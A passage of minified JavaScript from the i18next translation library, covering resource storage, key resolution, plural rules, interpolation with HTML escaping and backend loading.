t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g,"\\$&")}var k={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","/":"&#x2F;"};function x(t){return"string"==typeof t?t.replace(/[&<>"'\/]/g,(function(t){return k[t]})):t}var _="undefined"!=typeof window&&window.navigator&&window.navigator.userAgent&&window.navigator.userAgent.indexOf("MSIE")>-1,S=function(t){function e(t){var n,r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{ns:["translation"],defaultNS:"translation"};return i(this,e),n=a(this,l(e).call(this)),_&&f.call(s(n)),n.data=t||{},n.options=r,void 0===n.options.keySeparator&&(n.options.keySeparator="."),n}return u(e,f),o(e,[{key:"addNamespaces",value:function(t){this.options.ns.indexOf(t)<0&&this.options.ns.push(t)}},{key:"removeNamespaces",value:function(t){var e=this.options.ns.indexOf(t);e>-1&&this.options.ns.splice(e,1)}},{key:"getResource",value:function(t,e,n){var i=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{},r=void 0!==i.keySeparator?i.keySeparator:this.options.keySeparator,o=[t,e];return n&&"string"!=typeof n&&(o=o.concat(n)),n&&"string"==typeof n&&(o=o.concat(r?n.split(r):n)),t.indexOf(".")>-1&&(o=t.split(".")),y(this.data,o)}},{key:"addResource",value:function(t,e,n,i){var r=arguments.length>4&&void 0!==arguments[4]?arguments[4]:{silent:!1},o=this.options.keySeparator;void 0===o&&(o=".");var s=[t,e];n&&(s=s.concat(o?n.split(o):n)),t.indexOf(".")>-1&&(i=e,e=(s=t.split("."))[1]),this.addNamespaces(e),v(this.data,s,i),r.silent||this.emit("added",t,e,n,i)}},{key:"addResources",value:function(t,e,n){var i=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{silent:!1};for(var r in n)"string"!=typeof n[r]&&"[object Array]"!==Object.prototype.toString.apply(n[r])||this.addResource(t,e,r,n[r],{silent:!0});i.silent||this.emit("added",t,e,n)}},{key:"addResourceBundle",value:function(t,e,i,r,o){var s=arguments.length>5&&void 0!==arguments[5]?arguments[5]:{silent:!1},a=[t,e];t.indexOf(".")>-1&&(r=i,i=e,e=(a=t.split("."))[1]),this.addNamespaces(e);var l=y(this.data,a)||{};r?function t(e,n,i){for(var r in n)"__proto__"!==r&&(r in e?"string"==typeof e[r]||e[r]instanceof String||"string"==typeof n[r]||n[r]instanceof String?i&&(e[r]=n[r]):t(e[r],n[r],i):e[r]=n[r]);return e}(l,i,o):l=n({},l,i),v(this.data,a,l),s.silent||this.emit("added",t,e,i)}},{key:"removeResourceBundle",value:function(t,e){this.hasResourceBundle(t,e)&&delete this.data[t][e],this.removeNamespaces(e),this.emit("removed",t,e)}},{key:"hasResourceBundle",value:function(t,e){return void 0!==this.getResource(t,e)}},{key:"getResourceBundle",value:function(t,e){return e||(e=this.options.defaultNS),"v1"===this.options.compatibilityAPI?n({},{},this.getResource(t,e)):this.getResource(t,e)}},{key:"getDataByLanguage",value:function(t){return this.data[t]}},{key:"toJSON",value:function(){return this.data}}]),e}(),C={processors:{},addPostProcessor:function(t){this.processors[t.name]=t},handle:function(t,e,n,i,r){var o=this;return t.forEach((function(t){o.processors[t]&&(e=o.processors[t].process(e,n,i,r))})),e}},$={},E=function(e){function r(t){var e,n,o,c,u=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return i(this,r),e=a(this,l(r).call(this)),_&&f.call(s(e)),n=["resourceStore","languageUtils","pluralResolver","interpolator","backendConnector","i18nFormat","utils"],o=t,c=s(e),n.forEach((function(t){o[t]&&(c[t]=o[t])})),e.options=u,void 0===e.options.keySeparator&&(e.options.keySeparator="."),e.logger=h.create("translator"),e}return u(r,f),o(r,[{key:"changeLanguage",value:function(t){t&&(this.language=t)}},{key:"exists",value:function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{interpolation:{}},n=this.resolve(t,e);return n&&void 0!==n.res}},{key:"extractFromKey",value:function(t,e){var n=void 0!==e.nsSeparator?e.nsSeparator:this.options.nsSeparator;void 0===n&&(n=":");var i=void 0!==e.keySeparator?e.keySeparator:this.options.keySeparator,r=e.ns||this.options.defaultNS;if(n&&t.indexOf(n)>-1){var o=t.match(this.interpolator.nestingRegexp);if(o&&o.length>0)return{key:t,namespaces:r};var s=t.split(n);(n!==i||n===i&&this.options.ns.indexOf(s[0])>-1)&&(r=s.shift()),t=s.join(i)}return"string"==typeof r&&(r=[r]),{key:t,namespaces:r}}},{key:"translate",value:function(e,i,r){var o=this;if("object"!==t(i)&&this.options.overloadTranslationOptionHandler&&(i=this.options.overloadTranslationOptionHandler(arguments)),i||(i={}),null==e)return"";Array.isArray(e)||(e=[String(e)]);var s=void 0!==i.keySeparator?i.keySeparator:this.options.keySeparator,a=this.extractFromKey(e[e.length-1],i),l=a.key,c=a.namespaces,u=c[c.length-1],d=i.lng||this.language,h=i.appendNamespaceToCIMode||this.options.appendNamespaceToCIMode;if(d&&"cimode"===d.toLowerCase()){if(h){var f=i.nsSeparator||this.options.nsSeparator;return u+f+l}return l}var p=this.resolve(e,i),g=p&&p.res,m=p&&p.usedKey||l,v=p&&p.exactUsedKey||l,y=Object.prototype.toString.apply(g),b=void 0!==i.joinArrays?i.joinArrays:this.options.joinArrays,w=!this.i18nFormat||this.i18nFormat.handleAsObject;if(w&&g&&"string"!=typeof g&&"boolean"!=typeof g&&"number"!=typeof g&&["[object Number]","[object Function]","[object RegExp]"].indexOf(y)<0&&("string"!=typeof b||"[object Array]"!==y)){if(!i.returnObjects&&!this.options.returnObjects)return this.logger.warn("accessing an object - but returnObjects options is not enabled!"),this.options.returnedObjectHandler?this.options.returnedObjectHandler(m,g,i):"key '".concat(l," (").concat(this.language,")' returned an object instead of string.");if(s){var k="[object Array]"===y,x=k?[]:{},_=k?v:m;for(var S in g)if(Object.prototype.hasOwnProperty.call(g,S)){var C="".concat(_).concat(s).concat(S);x[S]=this.translate(C,n({},i,{joinArrays:!1,ns:c})),x[S]===C&&(x[S]=g[S])}g=x}}else if(w&&"string"==typeof b&&"[object Array]"===y)(g=g.join(b))&&(g=this.extendTranslation(g,e,i,r));else{var $=!1,E=!1;if(!this.isValidLookup(g)&&void 0!==i.defaultValue){if($=!0,void 0!==i.count){var T=this.pluralResolver.getSuffix(d,i.count);g=i["defaultValue".concat(T)]}g||(g=i.defaultValue)}this.isValidLookup(g)||(E=!0,g=l);var L=i.defaultValue&&i.defaultValue!==g&&this.options.updateMissing;if(E||$||L){if(this.logger.log(L?"updateKey":"missingKey",d,u,l,L?i.defaultValue:g),s){var O=this.resolve(l,n({},i,{keySeparator:!1}));O&&O.res&&this.logger.warn("Seems the loaded translations were in flat JSON format instead of nested. Either set keySeparator: false on init or make sure your translations are published in nested format.")}var I=[],A=this.languageUtils.getFallbackCodes(this.options.fallbackLng,i.lng||this.language);if("fallback"===this.options.saveMissingTo&&A&&A[0])for(var P=0;P<A.length;P++)I.push(A[P]);else"all"===this.options.saveMissingTo?I=this.languageUtils.toResolveHierarchy(i.lng||this.language):I.push(i.lng||this.language);var N=function(t,e){o.options.missingKeyHandler?o.options.missingKeyHandler(t,u,e,L?i.defaultValue:g,L,i):o.backendConnector&&o.backendConnector.saveMissing&&o.backendConnector.saveMissing(t,u,e,L?i.defaultValue:g,L,i),o.emit("missingKey",t,u,e,g)};if(this.options.saveMissing){var B=void 0!==i.count&&"string"!=typeof i.count;this.options.saveMissingPlurals&&B?I.forEach((function(t){o.pluralResolver.getPluralFormsOfKey(t,l).forEach((function(e){return N([t],e)}))})):N(I,l)}}g=this.extendTranslation(g,e,i,p,r),E&&g===l&&this.options.appendNamespaceToMissingKey&&(g="".concat(u,":").concat(l)),E&&this.options.parseMissingKeyHandler&&(g=this.options.parseMissingKeyHandler(g))}return g}},{key:"extendTranslation",value:function(t,e,i,r,o){var s=this;if(this.i18nFormat&&this.i18nFormat.parse)t=this.i18nFormat.parse(t,i,r.usedLng,r.usedNS,r.usedKey,{resolved:r});else if(!i.skipInterpolation){i.interpolation&&this.interpolator.init(n({},i,{interpolation:n({},this.options.interpolation,i.interpolation)}));var a,l=i.interpolation&&i.interpolation.skipOnVariables||this.options.interpolation.skipOnVariables;if(l){var c=t.match(this.interpolator.nestingRegexp);a=c&&c.length}var u=i.replace&&"string"!=typeof i.replace?i.replace:i;if(this.options.interpolation.defaultVariables&&(u=n({},this.options.interpolation.defaultVariables,u)),t=this.interpolator.interpolate(t,u,i.lng||this.language,i),l){var d=t.match(this.interpolator.nestingRegexp);a<(d&&d.length)&&(i.nest=!1)}!1!==i.nest&&(t=this.interpolator.nest(t,(function(){for(var t=arguments.length,n=new Array(t),i=0;i<t;i++)n[i]=arguments[i];return o&&o[0]===n[0]?(s.logger.warn("It seems you are nesting recursively key: ".concat(n[0]," in key: ").concat(e[0])),null):s.translate.apply(s,n.concat([e]))}),i)),i.interpolation&&this.interpolator.reset()}var h=i.postProcess||this.options.postProcess,f="string"==typeof h?[h]:h;return null!=t&&f&&f.length&&!1!==i.applyPostProcessor&&(t=C.handle(f,t,e,this.options&&this.options.postProcessPassResolved?n({i18nResolved:r},i):i,this)),t}},{key:"resolve",value:function(t){var e,n,i,r,o,s=this,a=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return"string"==typeof t&&(t=[t]),t.forEach((function(t){if(!s.isValidLookup(e)){var l=s.extractFromKey(t,a),c=l.key;n=c;var u=l.namespaces;s.options.fallbackNS&&(u=u.concat(s.options.fallbackNS));var d=void 0!==a.count&&"string"!=typeof a.count,h=void 0!==a.context&&"string"==typeof a.context&&""!==a.context,f=a.lngs?a.lngs:s.languageUtils.toResolveHierarchy(a.lng||s.language,a.fallbackLng);u.forEach((function(t){s.isValidLookup(e)||(o=t,!$["".concat(f[0],"-").concat(t)]&&s.utils&&s.utils.hasLoadedNamespace&&!s.utils.hasLoadedNamespace(o)&&($["".concat(f[0],"-").concat(t)]=!0,s.logger.warn('key "'.concat(n,'" for languages "').concat(f.join(", "),'" won\'t get resolved as namespace "').concat(o,'" was not yet loaded'),"This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!")),f.forEach((function(n){if(!s.isValidLookup(e)){r=n;var o,l,u=c,f=[u];for(s.i18nFormat&&s.i18nFormat.addLookupKeys?s.i18nFormat.addLookupKeys(f,c,n,t,a):(d&&(o=s.pluralResolver.getSuffix(n,a.count)),d&&h&&f.push(u+o),h&&f.push(u+="".concat(s.options.contextSeparator).concat(a.context)),d&&f.push(u+=o));l=f.pop();)s.isValidLookup(e)||(i=l,e=s.getResource(n,t,l,a))}})))}))}})),{res:e,usedKey:n,exactUsedKey:i,usedLng:r,usedNS:o}}},{key:"isValidLookup",value:function(t){return!(void 0===t||!this.options.returnNull&&null===t||!this.options.returnEmptyString&&""===t)}},{key:"getResource",value:function(t,e,n){var i=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{};return this.i18nFormat&&this.i18nFormat.getResource?this.i18nFormat.getResource(t,e,n,i):this.resourceStore.getResource(t,e,n,i)}}]),r}();function T(t){return t.charAt(0).toUpperCase()+t.slice(1)}var L=function(){function t(e){i(this,t),this.options=e,this.whitelist=this.options.supportedLngs||!1,this.supportedLngs=this.options.supportedLngs||!1,this.logger=h.create("languageUtils")}return o(t,[{key:"getScriptPartFromCode",value:function(t){if(!t||t.indexOf("-")<0)return null;var e=t.split("-");return 2===e.length?null:(e.pop(),"x"===e[e.length-1].toLowerCase()?null:this.formatLanguageCode(e.join("-")))}},{key:"getLanguagePartFromCode",value:function(t){if(!t||t.indexOf("-")<0)return t;var e=t.split("-");return this.formatLanguageCode(e[0])}},{key:"formatLanguageCode",value:function(t){if("string"==typeof t&&t.indexOf("-")>-1){var e=["hans","hant","latn","cyrl","cans","mong","arab"],n=t.split("-");return this.options.lowerCaseLng?n=n.map((function(t){return t.toLowerCase()})):2===n.length?(n[0]=n[0].toLowerCase(),n[1]=n[1].toUpperCase(),e.indexOf(n[1].toLowerCase())>-1&&(n[1]=T(n[1].toLowerCase()))):3===n.length&&(n[0]=n[0].toLowerCase(),2===n[1].length&&(n[1]=n[1].toUpperCase()),"sgn"!==n[0]&&2===n[2].length&&(n[2]=n[2].toUpperCase()),e.indexOf(n[1].toLowerCase())>-1&&(n[1]=T(n[1].toLowerCase())),e.indexOf(n[2].toLowerCase())>-1&&(n[2]=T(n[2].toLowerCase()))),n.join("-")}return this.options.cleanCode||this.options.lowerCaseLng?t.toLowerCase():t}},{key:"isWhitelisted",value:function(t){return this.logger.deprecate("languageUtils.isWhitelisted",'function "isWhitelisted" will be renamed to "isSupportedCode" in the next major - please make sure to rename it\'s usage asap.'),this.isSupportedCode(t)}},{key:"isSupportedCode",value:function(t){return("languageOnly"===this.options.load||this.options.nonExplicitSupportedLngs)&&(t=this.getLanguagePartFromCode(t)),!this.supportedLngs||!this.supportedLngs.length||this.supportedLngs.indexOf(t)>-1}},{key:"getBestMatchFromCodes",value:function(t){var e,n=this;return t?(t.forEach((function(t){if(!e){var i=n.formatLanguageCode(t);n.options.supportedLngs&&!n.isSupportedCode(i)||(e=i)}})),!e&&this.options.supportedLngs&&t.forEach((function(t){if(!e){var i=n.getLanguagePartFromCode(t);if(n.isSupportedCode(i))return e=i;e=n.options.supportedLngs.find((function(t){if(0===t.indexOf(i))return t}))}})),e||(e=this.getFallbackCodes(this.options.fallbackLng)[0]),e):null}},{key:"getFallbackCodes",value:function(t,e){if(!t)return[];if("string"==typeof t&&(t=[t]),"[object Array]"===Object.prototype.toString.apply(t))return t;if(!e)return t.default||[];var n=t[e];return n||(n=t[this.getScriptPartFromCode(e)]),n||(n=t[this.formatLanguageCode(e)]),n||(n=t[this.getLanguagePartFromCode(e)]),n||(n=t.default),n||[]}},{key:"toResolveHierarchy",value:function(t,e){var n=this,i=this.getFallbackCodes(e||this.options.fallbackLng||[],t),r=[],o=function(t){t&&(n.isSupportedCode(t)?r.push(t):n.logger.warn("rejecting language code not found in supportedLngs: ".concat(t)))};return"string"==typeof t&&t.indexOf("-")>-1?("languageOnly"!==this.options.load&&o(this.formatLanguageCode(t)),"languageOnly"!==this.options.load&&"currentOnly"!==this.options.load&&o(this.getScriptPartFromCode(t)),"currentOnly"!==this.options.load&&o(this.getLanguagePartFromCode(t))):"string"==typeof t&&o(this.formatLanguageCode(t)),i.forEach((function(t){r.indexOf(t)<0&&o(n.formatLanguageCode(t))})),r}}]),t}(),O=[{lngs:["ach","ak","am","arn","br","fil","gun","ln","mfe","mg","mi","oc","pt","pt-BR","tg","ti","tr","uz","wa"],nr:[1,2],fc:1},{lngs:["af","an","ast","az","bg","bn","ca","da","de","dev","el","en","eo","es","et","eu","fi","fo","fur","fy","gl","gu","ha","hi","hu","hy","ia","it","kn","ku","lb","mai","ml","mn","mr","nah","nap","nb","ne","nl","nn","no","nso","pa","pap","pms","ps","pt-PT","rm","sco","se","si","so","son","sq","sv","sw","ta","te","tk","ur","yo"],nr:[1,2],fc:2},{lngs:["ay","bo","cgg","fa","ht","id","ja","jbo","ka","kk","km","ko","ky","lo","ms","sah","su","th","tt","ug","vi","wo","zh"],nr:[1],fc:3},{lngs:["be","bs","cnr","dz","hr","ru","sr","uk"],nr:[1,2,5],fc:4},{lngs:["ar"],nr:[0,1,2,3,11,100],fc:5},{lngs:["cs","sk"],nr:[1,2,5],fc:6},{lngs:["csb","pl"],nr:[1,2,5],fc:7},{lngs:["cy"],nr:[1,2,3,8],fc:8},{lngs:["fr"],nr:[1,2],fc:9},{lngs:["ga"],nr:[1,2,3,7,11],fc:10},{lngs:["gd"],nr:[1,2,3,20],fc:11},{lngs:["is"],nr:[1,2],fc:12},{lngs:["jv"],nr:[0,1],fc:13},{lngs:["kw"],nr:[1,2,3,4],fc:14},{lngs:["lt"],nr:[1,2,10],fc:15},{lngs:["lv"],nr:[1,2,0],fc:16},{lngs:["mk"],nr:[1,2],fc:17},{lngs:["mnk"],nr:[0,1,2],fc:18},{lngs:["mt"],nr:[1,2,11,20],fc:19},{lngs:["or"],nr:[2,1],fc:2},{lngs:["ro"],nr:[1,2,20],fc:20},{lngs:["sl"],nr:[5,1,2,3],fc:21},{lngs:["he","iw"],nr:[1,2,20,21],fc:22}],I={1:function(t){return Number(t>1)},2:function(t){return Number(1!=t)},3:function(t){return 0},4:function(t){return Number(t%10==1&&t%100!=11?0:t%10>=2&&t%10<=4&&(t%100<10||t%100>=20)?1:2)},5:function(t){return Number(0==t?0:1==t?1:2==t?2:t%100>=3&&t%100<=10?3:t%100>=11?4:5)},6:function(t){return Number(1==t?0:t>=2&&t<=4?1:2)},7:function(t){return Number(1==t?0:t%10>=2&&t%10<=4&&(t%100<10||t%100>=20)?1:2)},8:function(t){return Number(1==t?0:2==t?1:8!=t&&11!=t?2:3)},9:function(t){return Number(t>=2)},10:function(t){return Number(1==t?0:2==t?1:t<7?2:t<11?3:4)},11:function(t){return Number(1==t||11==t?0:2==t||12==t?1:t>2&&t<20?2:3)},12:function(t){return Number(t%10!=1||t%100==11)},13:function(t){return Number(0!==t)},14:function(t){return Number(1==t?0:2==t?1:3==t?2:3)},15:function(t){return Number(t%10==1&&t%100!=11?0:t%10>=2&&(t%100<10||t%100>=20)?1:2)},16:function(t){return Number(t%10==1&&t%100!=11?0:0!==t?1:2)},17:function(t){return Number(1==t||t%10==1&&t%100!=11?0:1)},18:function(t){return Number(0==t?0:1==t?1:2)},19:function(t){return Number(1==t?0:0==t||t%100>1&&t%100<11?1:t%100>10&&t%100<20?2:3)},20:function(t){return Number(1==t?0:0==t||t%100>0&&t%100<20?1:2)},21:function(t){return Number(t%100==1?1:t%100==2?2:t%100==3||t%100==4?3:0)},22:function(t){return Number(1==t?0:2==t?1:(t<0||t>10)&&t%10==0?2:3)}},A=function(){function t(e){var n,r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};i(this,t),this.languageUtils=e,this.options=r,this.logger=h.create("pluralResolver"),this.rules=(n={},O.forEach((function(t){t.lngs.forEach((function(e){n[e]={numbers:t.nr,plurals:I[t.fc]}}))})),n)}return o(t,[{key:"addRule",value:function(t,e){this.rules[t]=e}},{key:"getRule",value:function(t){return this.rules[t]||this.rules[this.languageUtils.getLanguagePartFromCode(t)]}},{key:"needsPlural",value:function(t){var e=this.getRule(t);return e&&e.numbers.length>1}},{key:"getPluralFormsOfKey",value:function(t,e){var n=this,i=[],r=this.getRule(t);return r?(r.numbers.forEach((function(r){var o=n.getSuffix(t,r);i.push("".concat(e).concat(o))})),i):i}},{key:"getSuffix",value:function(t,e){var n=this,i=this.getRule(t);if(i){var r=i.noAbs?i.plurals(e):i.plurals(Math.abs(e)),o=i.numbers[r];this.options.simplifyPluralSuffix&&2===i.numbers.length&&1===i.numbers[0]&&(2===o?o="plural":1===o&&(o=""));var s=function(){return n.options.prepend&&o.toString()?n.options.prepend+o.toString():o.toString()};return"v1"===this.options.compatibilityJSON?1===o?"":"number"==typeof o?"_plural_".concat(o.toString()):s():"v2"===this.options.compatibilityJSON||this.options.simplifyPluralSuffix&&2===i.numbers.length&&1===i.numbers[0]?s():this.options.prepend&&r.toString()?this.options.prepend+r.toString():r.toString()}return this.logger.warn("no plural rule found for: ".concat(t)),""}}]),t}(),P=function(){function t(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};i(this,t),this.logger=h.create("interpolator"),this.options=e,this.format=e.interpolation&&e.interpolation.format||function(t){return t},this.init(e)}return o(t,[{key:"init",value:function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};t.interpolation||(t.interpolation={escapeValue:!0});var e=t.interpolation;this.escape=void 0!==e.escape?e.escape:x,this.escapeValue=void 0===e.escapeValue||e.escapeValue,this.useRawValueToEscape=void 0!==e.useRawValueToEscape&&e.useRawValueToEscape,this.prefix=e.prefix?w(e.prefix):e.prefixEscaped||"{{",this.suffix=e.suffix?w(e.suffix):e.suffixEscaped||"}}",this.formatSeparator=e.formatSeparator?e.formatSeparator:e.formatSeparator||",",this.unescapePrefix=e.unescapeSuffix?"":e.unescapePrefix||"-",this.unescapeSuffix=this.unescapePrefix?"":e.unescapeSuffix||"",this.nestingPrefix=e.nestingPrefix?w(e.nestingPrefix):e.nestingPrefixEscaped||w("$t("),this.nestingSuffix=e.nestingSuffix?w(e.nestingSuffix):e.nestingSuffixEscaped||w(")"),this.nestingOptionsSeparator=e.nestingOptionsSeparator?e.nestingOptionsSeparator:e.nestingOptionsSeparator||",",this.maxReplaces=e.maxReplaces?e.maxReplaces:1e3,this.alwaysFormat=void 0!==e.alwaysFormat&&e.alwaysFormat,this.resetRegExp()}},{key:"reset",value:function(){this.options&&this.init(this.options)}},{key:"resetRegExp",value:function(){var t="".concat(this.prefix,"(.+?)").concat(this.suffix);this.regexp=new RegExp(t,"g");var e="".concat(this.prefix).concat(this.unescapePrefix,"(.+?)").concat(this.unescapeSuffix).concat(this.suffix);this.regexpUnescape=new RegExp(e,"g");var n="".concat(this.nestingPrefix,"(.+?)").concat(this.nestingSuffix);this.nestingRegexp=new RegExp(n,"g")}},{key:"interpolate",value:function(t,e,n,i){var r,o,s,a=this,l=this.options&&this.options.interpolation&&this.options.interpolation.defaultVariables||{};function c(t){return t.replace(/\$/g,"$$$$")}var u=function(t){if(t.indexOf(a.formatSeparator)<0){var r=b(e,l,t);return a.alwaysFormat?a.format(r,void 0,n):r}var o=t.split(a.formatSeparator),s=o.shift().trim(),c=o.join(a.formatSeparator).trim();return a.format(b(e,l,s),c,n,i)};this.resetRegExp();var d=i&&i.missingInterpolationHandler||this.options.missingInterpolationHandler,h=i&&i.interpolation&&i.interpolation.skipOnVariables||this.options.interpolation.skipOnVariables;return[{regex:this.regexpUnescape,safeValue:function(t){return c(t)}},{regex:this.regexp,safeValue:function(t){return a.escapeValue?c(a.escape(t)):c(t)}}].forEach((function(e){for(s=0;r=e.regex.exec(t);){if(void 0===(o=u(r[1].trim())))if("function"==typeof d){var n=d(t,r,i);o="string"==typeof n?n:""}else{if(h){o=r[0];continue}a.logger.warn("missed to pass in variable ".concat(r[1]," for interpolating ").concat(t)),o=""}else"string"==typeof o||a.useRawValueToEscape||(o=g(o));if(t=t.replace(r[0],e.safeValue(o)),e.regex.lastIndex=0,++s>=a.maxReplaces)break}})),t}},{key:"nest",value:function(t,e){var i,r,o=this,s=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},a=n({},s);function l(t,e){var i=this.nestingOptionsSeparator;if(t.indexOf(i)<0)return t;var r=t.split(new RegExp("".concat(i,"[ ]*{"))),o="{".concat(r[1]);t=r[0],o=(o=this.interpolate(o,a)).replace(/'/g,'"');try{a=JSON.parse(o),e&&(a=n({},e,a))}catch(e){return this.logger.warn("failed parsing options string in nesting for key ".concat(t),e),"".concat(t).concat(i).concat(o)}return delete a.defaultValue,t}for(a.applyPostProcessor=!1,delete a.defaultValue;i=this.nestingRegexp.exec(t);){var c=[],u=!1;if(i[0].includes(this.formatSeparator)&&!/{.*}/.test(i[1])){var d=i[1].split(this.formatSeparator).map((function(t){return t.trim()}));i[1]=d.shift(),c=d,u=!0}if((r=e(l.call(this,i[1].trim(),a),a))&&i[0]===t&&"string"!=typeof r)return r;"string"!=typeof r&&(r=g(r)),r||(this.logger.warn("missed to resolve ".concat(i[1]," for nesting ").concat(t)),r=""),u&&(r=c.reduce((function(t,e){return o.format(t,e,s.lng,s)}),r.trim())),t=t.replace(i[0],r),this.regexp.lastIndex=0}return t}}]),t}(),N=function(t){function e(t,n,r){var o,c=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{};return i(this,e),o=a(this,l(e).call(this)),_&&f.call(s(o)),o.backend=t,o.store=n,o.services=r,o.languageUtils=r.languageUtils,o.options=c,o.logger=h.create("backendConnector"),o.state={},o.queue=[],o.backend&&o.backend.init&&o.backend.init(r,c.backend,c),o}return u(e,f),o(e,[{key:"queueLoad",value:function(t,e,n,i){var r=this,o=[],s=[],a=[],l=[];return t.forEach((function(t){var i=!0;e.forEach((function(e){var a="".concat(t,"|").concat(e);!n.reload&&r.store.hasResourceBundle(t,e)?r.state[a]=2:r.state[a]<0||(1===r.state[a]?s.indexOf(a)<0&&s.push(a):(r.state[a]=1,i=!1,s.indexOf(a)<0&&s.push(a),o.indexOf(a)<0&&o.push(a),l.indexOf(e)<0&&l.push(e)))})),i||a.push(t)})),(o.length||s.length)&&this.queue.push({pending:s,loaded:{},errors:[],callback:i}),{toLoad:o,pending:s,toLoadLanguages:a,toLoadNamespaces:l}}},{key:"loaded",value:function(t,e,n){var i=t.split("|"),r=i[0],o=i[1];e&&this.emit("failedLoading",r,o,e),n&&this.store.addResourceBundle(r,o,n),this.state[t]=e?-1:2;var s={};this.queue.forEach((function(n){var i,a,l,c,u;i=n.loaded,a=o,(c=(l=m(i,[r],Object)).obj)[u=l.k]=c[u]||[],c[u].push(a),function(t,e){for(var n=t.indexOf(e);-1!==n;)t.splice(n,1),n=t.indexOf(e)}(n.pending,t),e&&n.errors.push(e),0!==n.pending.length||n.done||(Object.keys(n.loaded).forEach((function(t){s[t]||(s[t]=[]),n.loaded[t].length&&n.loaded[t].forEach((function(e){s[t].indexOf(e)<0&&s[t].push(e)}))})),n.done=!0,n.errors.length?n.callback(n.errors):n.callback())})),this.emit("loaded",s),this.queue=this.queue.filter((function(t){return!t.done}))}},{key:"read",value:function(t,e,n){var i=this,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:0,o=arguments.length>4&&void 0!==arguments[4]?arguments[4]:350,s=arguments.length>5?arguments[5]:void 0;return t.length?this.backend[n](t,e,(function(a,l){a&&l&&r<5?setTimeout((function(){i.read.call(i,t,e,n,r+1,2*o,s)}),o):s(a,l)})):s(null,{})}},{key:"prepareLoading",value:function(t,e){var n=this,i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},r=arguments.length>3?arguments[3]:void 0;if(!this.backend)return this.logger.warn("No backend was added via i18next.use. Will not load resources."),r&&r();"string"==typeof t&&(t=this.languageUtils.toResolveHierarchy(t)),"string"==typeof e&&(e=[e]);var o=this.queueLoad(t,e,i,r);if(!o.toLoad.length)return o.pending.length||r(),null;o.toLoad.forEach((function(t){n.loadOne(t)}))}},{key:"load",value:function(t,e,n){this.prepareLoading(t,e,{},n)}},{key:"reload",value:function(t,e,n){this.prepareLoading(t,e,{reload:!0},n)}},{key:"loadOne",value:function(t){var e=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"",i=t.split("|"),r=i[0],o=i[1];this.read(r,o,"read",void 0,void 0,(function(i,s){i&&e.logger.warn("".concat(n,"loading namespace ").concat(o," for language ").concat(r," failed"),i),!i&&s&&e.logger.log("".concat(n,"loaded namespace ").concat(o," for language ").concat(r),s),e.loaded(t,i,s)}))}},{key:"saveMissing",value:function(t,e,i,r,o){var s=arguments.length>5&&void 0!==arguments[5]?arguments[5]:{};this.services.utils&&this.services.utils.hasLoadedNamespace&&!this.services.utils.hasLoadedNamespace(e)?this.logger.warn('did not save key "'.concat(i,'" as the namespace "').concat(e,'" was not yet loaded'),"This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!"):null!=i&&""!==i&&(this.backend&&this.backend.create&&this.backend.create(t,e,i,r,null,n({},s,{isUpdate:o})),t&&t[0]&&this.store.addResource(t[0],e,i,r))}}]),e}();function B(t){return"string"==typeof t.ns&&(t.ns=[t.ns]),"string"==typeof t.fallbackLng&&(t.fallbackLng=[t.fallbackLng]),"string"==typeof t.fallbackNS&&(t.fallbackNS=[t.fallbackNS]),t.whitelist&&(t.whitelist&&t.whitelist.indexOf("cimode")<0&&(t.whitelist=t.whitelist.concat(["cimode"])),t.supportedLngs=t.whitelist),t.nonExplicitWhitelist&&(t.nonExplicitSupportedLngs=t.nonExplicitWhitelist),t.supportedLngs&&t.supportedLngs.indexOf("cimode")<0&&(t.supportedLngs=t.supportedLngs.concat(["cimode"])),t}function D(){}return new(function(e){function r(){var t,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},n=arguments.length>1?arguments[1]:void 0;if(i(this,r),t=a(this,l(r).call(this)),_&&f.call(s(t)),t.options=B(e),t.services={},t.logger=h,t.modules={external:[]},n&&!t.isInitialized&&!e.isClone){if(!t.options.initImmediate)return t.init(e,n),a(t,s(t));setTimeout((function(){t.init(e,n)}),0)}return t}return u(r,f),o(r,[{key:"init",value:function(){var e=this,i=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},r=arguments.length>1?arguments[1]:void 0;function o(t){return t?"function"==typeof t?new t:t:null}if("function"==typeof i&&(r=i,i={}),i.whitelist&&!i.supportedLngs&&this.logger.deprecate("whitelist",'option "whitelist" will be renamed to "supportedLngs" in the next major - please make sure to rename this option asap.'),i.nonExplicitWhitelist&&!i.nonExplicitSupportedLngs&&this.logger.deprecate("whitelist",'options "nonExplicitWhitelist" will be renamed to "nonExplicitSupportedLngs" in the next major - please make sure to rename this option 